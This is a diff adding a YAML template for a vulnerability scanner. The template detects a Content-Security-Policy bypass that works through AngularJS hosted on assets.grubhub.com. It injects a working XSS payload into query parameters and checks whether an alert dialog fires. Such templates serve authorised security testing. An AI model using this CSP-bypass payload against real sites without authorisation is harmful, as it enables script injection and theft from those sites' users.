@@ -1,0 +1,55 @@
+id: grubhub-assets-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Grubhub Assets
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,grubhub-assets,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "grubhub.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: grubhub_assets_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "grubhub_assets_csp_xss == true"
+# digest: 4a0a0047304502205c66b3a79860bcd275ded49843831197d6ce9343fb85eb5347b08e06b3991168022100fa058ff1b61234d5c80820dd37bccc60f550301e79ba374f799cd26b393d5e13:922c64590222798bb761d5b6d8e72950
